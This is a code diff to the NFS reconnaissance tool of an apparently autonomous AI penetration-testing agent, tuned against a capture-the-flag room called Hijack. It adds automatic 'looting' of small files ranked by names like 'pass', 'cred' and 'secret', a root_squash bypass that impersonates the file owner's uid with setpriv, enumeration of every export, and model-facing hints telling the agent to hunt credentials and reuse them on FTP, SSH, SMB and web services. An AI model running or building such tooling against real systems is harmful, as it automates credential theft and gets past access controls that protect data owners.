@@ -49,6 +49,7 @@ from nexus_core.kernel.sandbox import (
 )
 
 from ._exec import run_in_sandbox
+from ._loot import decode_base64_text, loot_summary
 
 #: Actions the tool declares (the schema publishes exactly these values).
 NFS_ACTIONS: tuple[str, ...] = ("exports", "list", "read")
@@ -60,6 +61,12 @@ NFS_ACTIONS: tuple[str, ...] = ("exports", "list", "read")
 #: a shell: the model picks the target, never the command line.
 NFS_ALLOWED_PROGRAMS: tuple[str, ...] = (
     "showmount", "nfs-ls", "nfs-cat", "sudo", "mount", "umount", "find", "cat",
+    # ``stat``/``setpriv`` implement the UID mapping an export with
+    # ``root_squash`` forces: root is mapped to ``nobody``, so a file owned by
+    # uid 1002 with mode 600 is unreadable *as root* and readable only as that
+    # uid. The Hijack writeups create a local user with the same uid; the
+    # sandbox cannot, but ``setpriv --reuid`` drops to it for one command.
+    "stat", "setpriv",
 )
 
 NFS_DEFAULT_TIMEOUT_SECONDS = 60
@@ -104,6 +111,15 @@ NFS_MOUNT_OPTIONS = "vers=3,nolock,soft,timeo=50,retrans=2"
 
 #: Depth and width of the listing read from a mounted export.
 NFS_MOUNT_FIND_MAXDEPTH = 3
+
+#: Auto-loot: a listing is worth much more with the first bytes of the files in
+#: it. Measured in Hijack (the room this exists for): the export holds an FTP
+#: credential in a text file, the model listed the directory, and then spent
+#: turns guessing file names instead of reading the one that matters. The cap
+#: keeps one call bounded: six files, eight KB each, fifteen seconds each.
+NFS_LOOT_MAX_FILES = 6
+NFS_LOOT_MAX_BYTES = 8_192
+NFS_LOOT_TIMEOUT_SECONDS = 15
 
 #: Why the fallback could not run, spelled out for the model and the operator.
 NFS_MOUNT_FAILED_HINT = (
@@ -315,7 +331,10 @@ def nfs_definition(tenant_id: str = "system") -> ToolDefinition:
             "Enumera exports NFS con showmount -e y los lee con nfs-ls/nfs-cat "
             "(libnfs); si el export rechaza al cliente userland, monta el export "
             "con `sudo -n mount` (o reutiliza el montaje que el operador ya hizo) "
-            "y lee de ahí. Usa action=exports, list (path) o read (path + file)."
+            "y lee de ahí. action={\"list\"} SIN path lista TODOS los exports y "
+            "devuelve el contenido de los ficheros de texto pequeños (busca "
+            "credenciales ahí). action=exports solo la tabla; action=read "
+            "(path + file) un fichero concreto."
         ),
         input_schema={
             "type": "object",
@@ -349,8 +368,8 @@ async def nfs_handler(arguments: dict[str, Any], context: RunContext) -> ToolRes
     if action not in NFS_ACTIONS:
         raise ValueError(f"unsupported nfs action: {action!r}")
     path = _export_path(arguments["path"]) if arguments.get("path") else ""
-    if action in {"list", "read"} and not path:
-        raise ValueError(f"action={action} requires path (the NFS export)")
+    if action == "read" and not path:
+        raise ValueError("action=read requires path (the NFS export)")
     file = _validate_text(arguments.get("file"), "file", max_length=1024) if action == "read" else ""
     if action == "read" and not file:
         raise ValueError("action=read requires file")
@@ -360,6 +379,14 @@ async def nfs_handler(arguments: dict[str, Any], context: RunContext) -> ToolRes
         NFS_MAX_TIMEOUT_SECONDS,
         max(5, int(requested) if requested else NFS_DEFAULT_TIMEOUT_SECONDS),
     )
+    if action == "list" and not path:
+        # ``list`` without a path is the whole surface: enumerate every export
+        # and list it, instead of making the model guess the export name (Hijack
+        # v7 asked for ``/mnt/share`` on an export that is ``/``).
+        return await _list_every_export(
+            target, timeout_seconds, context, arguments
+        )
+
     workspace_root = os.getenv("NEXUS_WORKSPACE_ROOT", os.getcwd())
     sandbox, programs = _sandbox(workspace_root)
 
@@ -524,6 +551,9 @@ async def nfs_handler(arguments: dict[str, Any], context: RunContext) -> ToolRes
                 stdout=result.stdout,
                 stderr=result.stderr,
             )
+        loot = await _userland_loot(sandbox, programs, target, path, lines)
+        evidence["files_read"] = int(loot.get("files_total") or 0)
+        evidence["credentials_found"] = len(loot.get("credentials") or [])
         return ToolResult(
             output={
                 "target": target,
@@ -532,6 +562,7 @@ async def nfs_handler(arguments: dict[str, Any], context: RunContext) -> ToolRes
                 "entries": lines[:NFS_MAX_LISTING_LINES],
                 "count": len(lines[:NFS_MAX_LISTING_LINES]),
                 "truncated": len(lines) > NFS_MAX_LISTING_LINES,
+                **loot,
             },
             verified=True,
             verification_method="nfs_listing_parsed",
@@ -617,7 +648,10 @@ def _exports_result(
         # call is and what it needs, so a success here is never read as "NFS
         # enumerated" (Hijack v3 spent 23 calls importing pyNfsClient).
         output["next_steps"] = [
-            "Para ver el contenido de un export: "
+            "Lo más rápido: nexus.recon.nfs(target=..., action=\"list\") SIN path "
+            "-lista todos los exports y el contenido de los ficheros de texto "
+            "pequeños, que es donde suelen estar las credenciales-.",
+            "Para ver el contenido de un export concreto: "
             'nexus.recon.nfs(target=..., action="list", path="<export>").',
             "action=list usa el cliente userland `nfs-ls` (paquete `libnfs-utils`); "
             "si falta o el export lo rechaza, el handler monta el export con "
@@ -637,6 +671,229 @@ def _exports_result(
         stdout=result.stdout,
         stderr=result.stderr,
     )
+
+
+#: Names that usually hold the loot in a share, and the system trees that are
+#: noise when the export is ``/`` (the Hijack case). The auto-loot reads a few
+#: files; picking ``/etc/hostname`` over ``/mnt/share/for_you.txt`` wastes the
+#: one answer it gets.
+_LOOT_INTERESTING = (
+    "pass", "cred", "note", "user", "key", "secret", "hash", "for_you",
+    "readme", "todo", "ftp", "admin", "backup", "config", "flag",
+)
+_LOOT_NOISE = ("etc/", "usr/", "lib/", "bin/", "sbin/", "boot/", "dev/", "proc/", "sys/")
+
+
+def _loot_rank(relative: str) -> tuple[int, int]:
+    """Sort key: interesting names first, system trees last."""
+    lower = str(relative or "").lower()
+    if any(word in lower for word in _LOOT_INTERESTING):
+        return (0, len(lower))
+    if lower.startswith(_LOOT_NOISE):
+        return (2, len(lower))
+    return (1, len(lower))
+
+
+def _permission_denied(*texts: Any) -> bool:
+    """Whether a failure is the export's uid mapping, not a missing path."""
+    blob = " ".join(str(text or "") for text in texts).lower()
+    return any(
+        hint in blob
+        for hint in ("permission denied", "access denied", "nfs3err_acces", "eacces")
+    )
+
+
+async def _cat_with_prefix(
+    sandbox: Any,
+    programs: dict[str, str],
+    prefix: list[str],
+    path: str,
+    *,
+    timeout_seconds: float,
+) -> Any | None:
+    """Run ``cat path`` under ``prefix``; ``None`` when it cannot run at all."""
+    try:
+        return await run_in_sandbox(
+            sandbox,
+            [*prefix, programs["cat"], path],
+            timeout_seconds=timeout_seconds,
+            image_env="NEXUS_NFS_IMAGE",
+            default_image="python:3.12-alpine",
+        )
+    except (FileNotFoundError, PermissionError):
+        return None
+
+
+async def _uid_prefix(
+    sandbox: Any,
+    programs: dict[str, str],
+    prefix: list[str],
+    root: str,
+) -> list[str]:
+    """``prefix`` + ``setpriv`` as the numeric owner when root is squashed.
+
+    This is the writeup's "create a local user with the same uid", without
+    creating a user: ``setpriv --reuid=<uid> --regid=<gid> --clear-groups`` runs
+    one command as that uid. When the owner is root (or ``stat``/``setpriv`` are
+    not available) the original prefix is returned unchanged.
+    """
+    try:
+        result = await run_in_sandbox(
+            sandbox,
+            [*prefix, programs["stat"], "-c", "%u:%g", root],
+            timeout_seconds=15,
+            image_env="NEXUS_NFS_IMAGE",
+            default_image="python:3.12-alpine",
+        )
+    except (FileNotFoundError, PermissionError):
+        return prefix
+    match = re.fullmatch(r"(\d+):(\d+)", str(result.stdout or "").strip())
+    if match is None:
+        return prefix
+    uid, gid = match.groups()
+    if uid == "0":
+        return prefix
+    return [
+        *prefix,
+        programs["setpriv"],
+        f"--reuid={uid}",
+        f"--regid={gid}",
+        "--clear-groups",
+    ]
+
+
+async def _userland_loot(
+    sandbox: Any,
+    programs: dict[str, str],
+    target: str,
+    path: str,
+    entries: list[str],
+) -> dict[str, Any]:
+    """Read a few files through ``nfs-cat`` without mounting anything."""
+    candidates: list[str] = []
+    for raw in entries:
+        name = str(raw or "").strip()
+        if not name or name in {".", ".."} or name.endswith("/"):
+            continue
+        candidates.append(name)
+    candidates.sort(key=_loot_rank)
+    candidates = candidates[:NFS_LOOT_MAX_FILES]
+    files: list[dict[str, Any]] = []
+    for name in candidates:
+        try:
+            result = await run_in_sandbox(
+                sandbox,
+                [programs["nfs-cat"], _nfs_url(target, path, name)],
+                timeout_seconds=NFS_LOOT_TIMEOUT_SECONDS,
+                image_env="NEXUS_NFS_IMAGE",
+                default_image="python:3.12-alpine",
+            )
+        except (FileNotFoundError, PermissionError):
+            break
+        if result.timed_out or result.exit_code != 0:
+            continue
+        content = str(result.stdout or "")
+        if not content:
+            continue
+        item: dict[str, Any] = {
+            "name": name,
+            "size": len(content),
+            "preview": content[:NFS_LOOT_MAX_BYTES],
+        }
+        decoded = decode_base64_text(content)
+        if decoded is not None:
+            item["decoded"] = decoded[:NFS_LOOT_MAX_BYTES]
+        files.append(item)
+    return loot_summary(files)
+
+
+async def _discover_export_uid(
+    sandbox: Any,
+    programs: dict[str, str],
+    prefix: list[str],
+    mountpoint: str,
+) -> str | None:
+    """Numeric owner of an entry in a root-squashed export, if there is one.
+
+    This is the human's step in the Hijack writeups: "file access denied, files
+    owned by uid 1002, create a local user with that uid". The sandbox does not
+    create users, but ``setpriv --reuid`` reaches the same place. ``nobody``
+    (65534) means the mount already maps root there, so it is not a candidate.
+    """
+    try:
+        result = await run_in_sandbox(
+            sandbox,
+            [
+                *prefix, programs["find"], mountpoint,
+                "-maxdepth", "1", "-printf", "%u\n",
+            ],
+            timeout_seconds=20,
+            image_env="NEXUS_NFS_IMAGE",
+            default_image="python:3.12-alpine",
+        )
+    except (FileNotFoundError, PermissionError):
+        return None
+    for raw in str(result.stdout or "").splitlines():
+        uid = raw.strip()
+        if uid.isdigit() and uid not in {"0", "65534"}:
+            return uid
+    return None
+
+
+async def _mount_loot(
+    sandbox: Any,
+    programs: dict[str, str],
+    mountpoint: str,
+    lines: list[str],
+    prefix: list[str],
+) -> dict[str, Any]:
+    """Read the small regular files of a mounted export (bounded)."""
+    selected: list[str] = []
+    for line in lines:
+        parts = line.split(maxsplit=2)
+        if len(parts) < 3 or parts[0] != "f":
+            continue
+        try:
+            size = int(parts[1])
+        except ValueError:
+            size = 0
+        if size > NFS_LOOT_MAX_BYTES:
+            continue
+        selected.append(parts[2].strip())
+    selected.sort(key=_loot_rank)
+    selected = selected[:NFS_LOOT_MAX_FILES]
+    files: list[dict[str, Any]] = []
+    current = prefix
+    for relative in selected:
+        child = _safe_child(mountpoint, relative)
+        if child is None:
+            continue
+        result = await _cat_with_prefix(
+            sandbox, programs, current, child, timeout_seconds=NFS_LOOT_TIMEOUT_SECONDS
+        )
+        if result is not None and result.exit_code != 0 and _permission_denied(
+            result.stderr, result.stdout
+        ):
+            # The *file's* owner, not the export root: a 700 directory can be
+            # traversed by its own uid and by nobody else.
+            current = await _uid_prefix(sandbox, programs, prefix, child)
+            result = await _cat_with_prefix(
+                sandbox, programs, current, child,
+                timeout_seconds=NFS_LOOT_TIMEOUT_SECONDS,
+            )
+        if result is None or result.exit_code != 0 or result.timed_out:
+            continue
+        content = str(result.stdout or "")
+        decoded = decode_base64_text(content)
+        item: dict[str, Any] = {
+            "path": relative,
+            "size": len(content),
+            "preview": content[:NFS_LOOT_MAX_BYTES],
+        }
+        if decoded is not None:
+            item["decoded"] = decoded[:NFS_LOOT_MAX_BYTES]
+        files.append(item)
+    return loot_summary(files)
 
 
 async def _mount_fallback(
@@ -708,6 +965,32 @@ async def _mount_fallback(
                 sandbox, command, timeout_seconds=min(int(timeout_seconds), 120),
                 image_env="NEXUS_NFS_IMAGE", default_image="python:3.12-alpine",
             )
+            effective = elevate
+            if (
+                not result.timed_out
+                and result.exit_code != 0
+                and _permission_denied(result.stderr, result.stdout)
+            ):
+                # ``root_squash``: root maps to ``nobody`` and the entries belong
+                # to a numeric uid. Find it, then list as that uid.
+                uid = await _discover_export_uid(sandbox, programs, elevate, mountpoint)
+                if uid:
+                    effective = [
+                        *elevate, programs["setpriv"], f"--reuid={uid}",
+                        f"--regid={uid}", "--clear-groups",
+                    ]
+                    retry = await run_in_sandbox(
+                        sandbox,
+                        [*effective, programs["find"], mountpoint,
+                         "-maxdepth", str(NFS_MOUNT_FIND_MAXDEPTH),
+                         "-printf", "%y %10s %p\\n"],
+                        timeout_seconds=min(int(timeout_seconds), 120),
+                        image_env="NEXUS_NFS_IMAGE",
+                        default_image="python:3.12-alpine",
+                    )
+                    if not retry.timed_out and str(retry.stdout or "").strip():
+                        result = retry
+                        evidence["listed_as_uid"] = uid
             if result.timed_out:
                 return None, "find timed out over the mounted export"
             lines: list[str] = []
@@ -720,8 +1003,24 @@ async def _mount_fallback(
                 if line.split(maxsplit=2)[-1] == mountpoint:
                     continue
                 lines.append(line.replace(mountpoint + "/", "").strip())
+            if not lines and result.exit_code != 0:
+                # Never report a failed ``find`` as an empty export: that is what
+                # told hijack_v7 there was nothing in the share.
+                return None, (
+                    (result.stderr or result.stdout or "").strip()[:2_000]
+                    or f"find exited with {result.exit_code}"
+                )
             evidence["entries_total"] = len(lines)
             entries = lines[:NFS_MAX_LISTING_LINES]
+            # Auto-loot: the first bytes of the small files, in the same answer.
+            # Without it the model guesses names (Hijack: ``README.txt``) and
+            # burns turns on 404-style failures instead of reading the file that
+            # holds the credential.
+            loot = await _mount_loot(
+                sandbox, programs, mountpoint, lines, effective
+            )
+            evidence["files_read"] = int(loot.get("files_total") or 0)
+            evidence["credentials_found"] = len(loot.get("credentials") or [])
             listing = ToolResult(
                 output={
                     "target": target,
@@ -731,12 +1030,12 @@ async def _mount_fallback(
                     "entries": entries,
                     "count": len(entries),
                     "truncated": len(lines) > NFS_MAX_LISTING_LINES,
-                    "files_landed": False,
+                    **loot,
                     "hint": (
-                        "Listado leído desde un montaje real del export. Usa "
-                        "nexus.recon.nfs(action=\"read\", path=..., file=\"<ruta de "
-                        "la lista>\") para traer el contenido de cada fichero "
-                        "interesante a la pizarra."
+                        "Listado leído desde un montaje real del export, con el "
+                        "contenido de los ficheros de texto pequeños incluido. Si "
+                        "un fichero no aparece en `files`, léelo con "
+                        'nexus.recon.nfs(action="read", path=..., file="<ruta>").'
                     ),
                 },
                 verified=True,
@@ -756,6 +1055,21 @@ async def _mount_fallback(
             timeout_seconds=min(int(timeout_seconds), 120),
             image_env="NEXUS_NFS_IMAGE", default_image="python:3.12-alpine",
         )
+        if (
+            not result.timed_out
+            and result.exit_code != 0
+            and _permission_denied(result.stderr, result.stdout)
+        ):
+            # ``root_squash``: the file belongs to another uid and root reads it
+            # as ``nobody``. Drop to the numeric owner for this one command.
+            as_owner = await _uid_prefix(sandbox, programs, elevate, child)
+            if as_owner != elevate:
+                evidence["read_as_owner"] = True
+                result = await run_in_sandbox(
+                    sandbox, [*as_owner, programs["cat"], child],
+                    timeout_seconds=min(int(timeout_seconds), 120),
+                    image_env="NEXUS_NFS_IMAGE", default_image="python:3.12-alpine",
+                )
         if result.timed_out:
             return None, "cat timed out over the mounted export"
         if result.exit_code != 0:
@@ -795,6 +1109,122 @@ async def _mount_fallback(
                 )
             except (FileNotFoundError, PermissionError, OSError):
                 evidence["umount"] = "failed"
+
+
+async def _list_every_export(
+    target: str,
+    timeout_seconds: int,
+    context: RunContext,
+    arguments: dict[str, Any],
+) -> ToolResult:
+    """``action=list`` with no path: the whole export surface in one answer.
+
+    Measured in hijack_v7 (2026-10-30, iterations 24-47): the model ran
+    ``showmount``, got the table, and then asked for ``/mnt/share`` -a path it
+    invented- until the branch closed. The export was ``/`` and the file it
+    needed was two directories below it. Listing every export removes the guess,
+    and each listing already brings the small text files with it.
+    """
+    workspace_root = os.getenv("NEXUS_WORKSPACE_ROOT", os.getcwd())
+    sandbox, programs = _sandbox(workspace_root)
+    evidence: dict[str, Any] = {
+        "action": "list",
+        "target": target,
+        "noise_level": "low",
+        "all_exports": True,
+    }
+    result, exports = await _exports(
+        sandbox, target, timeout_seconds, program=programs["showmount"]
+    )
+    if result is None:
+        return ToolResult(
+            output={
+                "error": "showmount is not available in the sandbox",
+                "target": target,
+                "guidance": NFS_INSTALL_GUIDANCE["showmount"],
+            },
+            verified=False,
+            outcome="unavailable",
+            verification_method="nfs_showmount_unavailable",
+            evidence=evidence,
+        )
+    if result.exit_code != 0 and not exports:
+        # rpcbind/mountd refused or the host ignores the RPC call: that is the
+        # same answer ``action=exports`` gives, with the same install/pivot hint.
+        return _exports_result(result, exports, evidence, target=target)
+    if not exports:
+        return ToolResult(
+            output={
+                "target": target,
+                "action": "list",
+                "exports": [],
+                "count": 0,
+                "message": (
+                    "El host responde a rpcbind pero no exporta ninguna ruta: no "
+                    "hay nada que listar por NFS. Pivota a otro servicio."
+                ),
+            },
+            verified=True,
+            outcome="negative",
+            verification_method="nfs_no_exports",
+            evidence=evidence,
+        )
+    per_export_timeout = max(10, min(int(timeout_seconds), 45))
+    listed: list[dict[str, Any]] = []
+    files: list[dict[str, Any]] = []
+    credentials: list[dict[str, str]] = []
+    for entry in exports[:5]:
+        child_arguments = {
+            "target": target,
+            "action": "list",
+            "path": entry["path"],
+            "timeout_seconds": per_export_timeout,
+        }
+        child = await nfs_handler(child_arguments, context)
+        output = child.output if isinstance(child.output, dict) else {}
+        listed.append(
+            {
+                "path": entry["path"],
+                "verified": child.verified,
+                "outcome": child.outcome or "",
+                "output": output,
+            }
+        )
+        for item in output.get("files") or []:
+            if isinstance(item, dict) and item not in files:
+                files.append(item)
+        for handle in output.get("credentials") or []:
+            if isinstance(handle, dict) and handle not in credentials:
+                credentials.append(handle)
+    verified = any(item["verified"] for item in listed)
+    outcomes = {str(item["outcome"]) for item in listed}
+    evidence["exports_total"] = len(exports)
+    evidence["exports_listed"] = len(listed)
+    evidence["files_read"] = len(files)
+    evidence["credentials_found"] = len(credentials)
+    summary: dict[str, Any] = {
+        "target": target,
+        "action": "list",
+        "all_exports": True,
+        "exports": listed,
+        "count": len(listed),
+        "files": files,
+        "files_total": len(files),
+        "credentials": credentials,
+    }
+    if credentials:
+        summary["next_steps"] = [
+            "Credenciales encontradas en los exports: úsalas en el servicio que "
+            "corresponda (FTP, SSH, SMB, web) con la tool de ese servicio "
+            "(nexus.recon.ftp acepta username/password).",
+        ]
+    return ToolResult(
+        output=summary,
+        verified=verified,
+        outcome="" if verified else ("partial" if "partial" in outcomes else "negative"),
+        verification_method="nfs_all_exports_listed",
+        evidence=evidence,
+    )
 
 
 __all__ = [
